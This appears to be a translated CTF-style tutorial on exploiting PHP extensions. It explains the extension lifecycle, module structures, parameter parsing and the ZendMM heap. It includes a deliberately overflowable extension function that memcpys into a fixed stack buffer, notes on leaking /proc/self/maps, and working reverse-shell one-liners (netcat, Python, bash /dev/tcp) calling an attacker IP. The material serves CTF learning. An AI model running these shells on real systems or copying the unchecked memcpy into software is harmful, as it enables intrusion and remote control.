# Introduction

Web pwn currently mostly targets PHP. What we need to focus on analyzing is the external extensions loaded by PHP, since the vulnerability usually lies in the .so extension libraries. Because PHP loads an extension library to call its internal functions, the biggest difference from regular PWN challenges is that we cannot directly obtain an interactive shell. Here we usually need to use popen or the exec function family to execute bash commands to spawn a reverse shell; directly executing one_gadget or system is not feasible.

# Lifecycle

1. Lifecycle of an extension module:

a) Module Init (MINIT): when the PHP interpreter starts, it loads the relevant modules and calls each module's MINIT method at this point; it is called only once.
Example: suppose we have a database connection pool extension.
```c
PHP_MINIT_FUNCTION(db_pool)
{
    // 初始化连接池
    initialize_connection_pool();
    return SUCCESS;
}
```
This function is called only once when PHP starts, and is used to initialize the connection pool.

b) Request Init (RINIT): triggered every time a request arrives. The SAPI layer hands control over to the PHP layer; PHP initializes the environment variables, function lists, etc. needed to execute the script for this request, and calls the RINIT functions of all modules.
Example: a session management extension.
```c
PHP_RINIT_FUNCTION(session_manager)
{
    // 为每个请求创建新的会话
    create_new_session();
    return SUCCESS;
}
```
This function is called at the beginning of every HTTP request to create a new session for each request.

c) Request Shutdown (RSHUTDOWN): when the request ends, PHP automatically runs its cleanup routine, calling each module's RSHUTDOWN method in turn to clean up the symbol table used while the program was running.
Example: an extension that cleans up request-specific resources.
```c
PHP_RSHUTDOWN_FUNCTION(resource_cleaner)
{
    // 清理请求期间分配的资源
    free_request_resources();
    return SUCCESS;
}
```
Called when each request ends, used to clean up the resources used by that request.

d) Module Shutdown (MSHUTDOWN): when the server shuts down, PHP calls each module's MSHUTDOWN method to release memory.
Example: shutting down the database connection pool.
```c
PHP_MSHUTDOWN_FUNCTION(db_pool)
{
    // 关闭连接池
    shutdown_connection_pool();
    return SUCCESS;
}
```
Called when PHP terminates, used to clean up module-level resources.

2. PHP run modes:

a) CLI run mode (single-process SAPI):
Example:
```bash
php script.php
```
This starts the PHP interpreter, executes script.php, and then exits. The whole process has only one MINIT and one MSHUTDOWN, but RINIT and RSHUTDOWN are each called once for the script execution.

b) CGI run mode (mostly multi-process SAPI):
Example: Apache with mod_cgi
When an HTTP request arrives, Apache forks a new PHP process for each request.
```
[Apache] <- HTTP Request
    |
    ├── [PHP Process 1] (MINIT -> RINIT -> Execute -> RSHUTDOWN -> MSHUTDOWN)
    |
    ├── [PHP Process 2] (MINIT -> RINIT -> Execute -> RSHUTDOWN -> MSHUTDOWN)
    |
    └── [PHP Process 3] (MINIT -> RINIT -> Execute -> RSHUTDOWN -> MSHUTDOWN)
```
Each process terminates after handling a single request, so every request goes through the complete module lifecycle.
> The forked process generally has exactly the same memory layout as the original process. So if we can obtain the /proc/{pid}/maps file here, we can obtain the memory layout of that process, forming a memory leak. In De1CTF, this was the first breakthrough for that WEBPWN challenge: the vulnerable include function was used to read /proc/self/maps, which reveals all base addresses and thereby defeats PIE protection.

c) FastCGI run mode (multi-process SAPI, but processes are reusable):
Example: Nginx with PHP-FPM
```
[Nginx] <- HTTP Requests
    |
    ├── [PHP-FPM Process 1] (MINIT -> [RINIT -> Execute -> RSHUTDOWN] x N -> MSHUTDOWN)
    |
    └── [PHP-FPM Process 2] (MINIT -> [RINIT -> Execute -> RSHUTDOWN] x N -> MSHUTDOWN)
```
PHP-FPM processes only exit after handling multiple requests, so MINIT and MSHUTDOWN are called only once at process startup and termination, while RINIT and RSHUTDOWN are called for each request.

1. config.m4
   - Purpose: configuration script for Unix-like systems
   - Role: defines the extension's build options, including dependencies, compile flags, etc.
   - Used when running ./configure

2. config.w32
   - Purpose: configuration script for Windows systems
   - Role: similar to config.m4, but for the Windows environment
   - Used when compiling the extension on Windows

3. hello.c
   - Purpose: the extension's main source code file
   - Role:
     - Contains the implementation of the extension's core functionality
     - Defines PHP functions, classes, constants, etc.
     - Contains the module initialization and shutdown functions

4. php_hello.h
   - Purpose: the extension's header file
   - Role:
     - Declares the functions defined in hello.c
     - Defines the constants and macros used by the extension
     - May contain other necessary structure definitions

5. tests/ directory
   - Purpose: stores the extension's test files
   - Role:
     - Contains .phpt files used to test the extension's functionality
     - Helps ensure the extension works properly in different environments
     - These tests can be run with `make test`


## Writing the Extension Module
Writing a PHP extension is based on the Zend API and a set of macros, so if we want to write the core code, we first need to understand the structure of a PHP Extension. Because at the C language level, a PHP Extension is actually just a zend_module_entry struct.

The definition of its type zend_module_entry can be found in the "Zend/zend_modules.h" file of the PHP source code. The following code is the definition of zend_module_entry.

```c
typedef struct _zend_module_entry zend_module_entry;
struct _zend_module_entry {
  unsigned short size;
  unsigned int zend_api;
  unsigned char zend_debug;
  unsigned char zts;
  const struct _zend_ini_entry *ini_entry;
  const struct _zend_module_dep *deps;
  const char *name;        # PHP Extension的名字
  const struct _zend_function_entry *functions;  # 存放我们在此扩展中定义的函数的引用
  int (*module_startup_func)(INIT_FUNC_ARGS);  # 函数指针，扩展模块加载时被调用
  int (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS); # 函数指针，扩展模块卸载时时被调用
  int (*request_startup_func)(INIT_FUNC_ARGS); # 函数指针，每个请求开始时时被调用
  int (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS); # 函数指针，每个请求结束时时被调用
  void (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS);  # 函数指针，这个指针指向的函数会在执行phpinfo()时被调用，用于显示自定义模块信息。
  const char *version;  # 模块的版本
  size_t globals_size;
  #ifdef ZTS
  ts_rsrc_id* globals_id_ptr;
  #else
  void* globals_ptr;
  #endif
  void (*globals_ctor)(void *global TSRMLS_DC);
  void (*globals_dtor)(void *global TSRMLS_DC);
  int (*post_deactivate_func)(void);
  int module_started;
  unsigned char type;
  void *handle;
  int module_number;
  char *build_id;
};
```
Now let's look at the automatically generated `hello_module_entry`.

```c
zend_module_entry hello_module_entry = {
	STANDARD_MODULE_HEADER,
	"hello",					/* Extension name */
	hello_functions,			/* zend_function_entry */
	NULL,							/* PHP_MINIT - Module initialization */
	NULL,							/* PHP_MSHUTDOWN - Module shutdown */
	PHP_RINIT(hello),			/* PHP_RINIT - Request initialization */
	NULL,							/* PHP_RSHUTDOWN - Request shutdown */
	PHP_MINFO(hello),			/* PHP_MINFO - Module info */
	PHP_HELLO_VERSION,		/* Version */
	STANDARD_MODULE_PROPERTIES
};
```
The macro "STANDARD_MODULE_HEADER" generates the first 6 fields, "STANDARD_MODULE_PROPERTIES" generates the fields after "version", and in between are the functions called at each stage of operation.

```c
PHP_RINIT(hello)对应到

……
}
PHP_MINFO(hello)对应到
PHP_MINFO_FUNCTION(hello)
{
……
}

```
Functions decorated with the PHP_FUNCTION macro can be called directly in PHP.

```c
PHP_FUNCTION(easy_phppwn)
{
	char *arg = NULL;
    size_t arg_len, len;
    char buf[100];
    if(zend_parse_parameters(ZEND_NUM_ARGS(), "s", &arg, &arg_len) == FAILURE){
        return;
    }
    memcpy(buf, arg, arg_len);
    php_printf("The baby phppwn.\n");
    return SUCCESS;
}
```
> Parameter parsing is implemented through the zend_parse_parameters function. This function reads data from the function user's input stack, then converts it into the corresponding function parameters and fills them into variables for the core functionality code that follows. The first argument of zend_parse_parameters is the number of parameters passed in by the user, which can be generated by the macro "ZEND_NUM_ARGS()"; the second argument is a string in which each letter represents a variable type — we only have one string-type variable, so the second argument is "s"; finally, each parameter needs some necessary local variable pointers to store the data. The table below gives the letters for the different variable types and the local variable pointers they require.

```bash
对于一个参数，可以使用一个字符序列表示该参数的解析规则。在后面的变长参数中，需要顺序传入参数保存值的引用值。

PHP使用一个字母表示参数应该被解析为什么类型。具体的对应关系如下：

a  - array (zval*)
A  - array or object (zval*)
b  - boolean (zend_bool)
C  - class (zend_class_entry*)
d  - double (double)
f  - function or array containing php method call info (returned as
     zend_fcall_info and zend_fcall_info_cache)
h  - array (returned as HashTable*)
H  - array or HASH_OF(object) (returned as HashTable*)
l  - long (zend_long)
n  - long or double (zval*)
o  - object of any type (zval*)
O  - object of specific type given by class entry (zval*, zend_class_entry)
p  - valid path (string without null bytes in the middle) and its length (char*, size_t)
P  - valid path (string without null bytes in the middle) as zend_string (zend_string*)
r  - resource (zval*)
s  - string (with possible null bytes) and its length (char*, size_t)
S  - string (with possible null bytes) as zend_string (zend_string*)
z  - the actual zval (zval*)
*  - variable arguments list (0 or more)
+  - variable arguments list (1 or more)

还可以使用下面3个符号：

|  - 放在上面字母的前面表示参数的解析规则为可选参数，其应该被初始化为默认值，以防止PHP代码没有传入该参数。
/  - 对其所跟的参数调用 SEPARATE_ZVAL()。 
!  - 所跟的参数可以为指定类型或 NULL。如果传入 NULL 且输出类型为指针，则输出的 C 语言指针为 NULL。对于类型 'b'、'l'、'd'，一个额外的 zend_bool* 类型需要在对应的 bool*、zend_long*、double* 后被传入。如果传入 PHP NULL 则一个非0值将会被写到 zend_bool 中。

```

And finally it needs to be registered in `zend_function_entry`.

```c
static const zend_function_entry hello_functions[] = {
	PHP_FE(easy_phppwn,		NULL)
	PHP_FE_END
};
```
Then put it at the position of ` const struct _zend_function_entry *functions;  # 存放我们在此扩展中定义的函数的引用` in `hello_module_entry`.

## Reverse Shell

How it works:
1. The attacker listens on a specific port on their own machine
2. A command is executed on the target machine to make it connect back to the attacker's machine
3. Once the connection is established, the target machine's shell is redirected to this connection

Examples:

1. Example using netcat (nc):

Attacker's machine (IP: 10.0.0.1):
```
nc -lvp 4444
```
This listens for incoming connections on port 4444.

Target machine:
```
nc 10.0.0.1 4444 -e /bin/bash
```
This connects to the attacker's machine and executes a bash shell.

2. Example using Python:

Attacker's machine (IP: 10.0.0.1):
```
nc -lvp 4444
```

Target machine:
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

3. Example using Bash:

Attacker's machine (IP: 10.0.0.1):
```
nc -lvp 4444
```

Target machine:
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

All of these examples create a shell on the target machine and redirect its input/output to the attacker's machine.

## PHP Heap Source Code

zend_alloc allocates memory from the operating system in CHUNKs, each containing 2MB of memory. Huge allocations are those that exceed a whole chunk, and zend_alloc uses mmap to allocate them. The concept of a PAGE is commonly used in ZendMM and usually contains 4KB of memory. In other words, one chunk contains 512 pages. Small allocations are less than 3/4 of the page size. The rest are large allocations.
```c

 *         Allocation inside RUNs implemented using linked list of free
```

```c
static zend_never_inline void *zend_mm_alloc_small_slow(zend_mm_heap *heap, uint32_t bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)
{
	zend_mm_chunk *chunk;
	int page_num;
	zend_mm_bin *bin;
	zend_mm_free_slot *p, *end;

	bin = (zend_mm_bin*)zend_mm_alloc_pages(heap, bin_pages[bin_num] ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);

	if (UNEXPECTED(bin == NULL)) {
		/* insufficient memory */
		return NULL;
	}

	chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);
	page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;
	chunk->map[page_num] = ZEND_MM_SRUN(bin_num);
	if (bin_pages[bin_num] > 1) {
		uint32_t i = 1;

		do {
			chunk->map[page_num+i] = ZEND_MM_NRUN(bin_num, i);
			i++;
		} while (i < bin_pages[bin_num]);
	}

	/* create a linked list of elements from 1 to last */
	end = (zend_mm_free_slot*)((char*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - 1)));
	heap->free_slot[bin_num] = p = (zend_mm_free_slot*)((char*)bin + bin_data_size[bin_num]);
	do {
		p->next_free_slot = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
		p = (zend_mm_free_slot*)((char*)p + bin_data_size[bin_num]);
	} while (p != end);

	/* terminate list using NULL */
	p->next_free_slot = NULL;

	/* return first element */
	return bin;
}
```
